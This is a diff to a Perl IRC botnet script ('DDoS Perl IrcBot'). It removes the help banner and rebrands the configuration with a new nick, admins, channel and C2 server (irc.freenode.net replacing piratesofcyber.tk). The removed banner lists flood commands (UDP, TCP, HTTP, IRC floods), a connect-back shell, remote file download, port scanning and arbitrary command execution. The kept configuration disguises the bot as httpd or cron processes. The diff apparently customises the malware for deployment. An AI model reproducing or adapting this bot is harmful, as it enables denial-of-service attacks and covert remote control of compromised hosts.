@@ -5,35 +5,7 @@ use IO::Socket::INET;
 use IO::Select;
 #use strict;
 use warnings;
- 
-######################################################################################################################
-######################################################################################################################
-##  DDoS Perl IrcBot v1.0 / 2016 modded by  gutowsc       ## [ Help ] #########################################
-##      Stealth MultiFunctional IrcBot writen in Perl          #######################################################
-##        Teste on every system with PERL instlled             ##  !u @system                                       ##
-##                                                             ##  !u @version                                      ##
-##     This is a free program used on your own risk.           ##  !u @channel                                      ##
-##        Created for educational purpose only.                ##  !u @flood                                        ##
-## I'm not responsible for the illegal use of this program.    ##  !u @utils                                        ##
-######################################################################################################################
-## [ Channel ] #################### [ Flood ] ################################## [ Utils ] ###########################
-######################################################################################################################
-##  !u @join <#channel>            ##  !u @udp1 <ip> <port> <time>              ##  !u @cback <ip> <port>             ##
-##  !u @part <#channel>          ##  !u @udp2 <ip> <packet size> <time>       ##  !u @downlod <url+path> <file>     ##
-##  !u !uejoin <#channel>        ##  !u @udp3 <ip> <port> <time>              ##  !u @portscan <ip>                 ##
-##  !u !op <channel> <nick>      ##  !u @tcp <ip> <port> <packet size> <time> ##  !u @mail <subject> <sender>       ##
-##  !u !deop <channel> <nick>    ##  !u @http <site> <time>                   ##           <recipient> <message>    ##
-##  !u !voice <channel> <nick>   ##                                           ##  !u pwd;uname -a;id <for example>  ##
-##  !u !devoice <channel> <nick> ##  !u @ctcpflood <nick>                     ##  !u @port <ip> <port>              ##
-##  !u !nick <newnick>           ##  !u @msgflood <nick>                      ##  !u @dns <ip/host>                 ##
-##  !u !msg <nick>               ##  !u @noticeflood <nick>                   ##                                    ##
-##  !u !quit                     ##                                           ##                                    ##
-##  !u !uaw                      ##                                           ##                                    ##
-##  !u @die                      ##                                           ##                                    ##
-##                               ##                                           ##                                    ##
-######################################################################################################################
-######################################################################################################################
- 
+
 #############################
 ##### [ Configuration ] #####
 #############################
@@ -50,21 +22,21 @@ my @rps = ("/usr/local/apache/bin/httpd",
            "/usr/sbin/cron");
 
 my $process = $rps[rand scalar @rps];
-my @rversion = ("guto");
+my @rversion = ("astra");
 my $vers = $rversion[rand scalar @rversion];
-my @rircname = ("guto-bot");
+my @rircname = ("astra-bot");
 my $ircname = $rircname[rand scalar @rircname];
 chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
-my $server = 'piratesofcyber.tk';
-my $port = '9981';
+my $server = 'irc.freenode.net';
+my $port = '6667';
 my $linas_max='8';
 my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'v.02';
-my @admins = ("guto");
+my @admins = ("ASTRA_");
 #my @hostauth = ("gov");
-my @channels = ("#guto");
+my @channels = ("#astranet");
 my $pacotes = 1;
 
 #################################################################
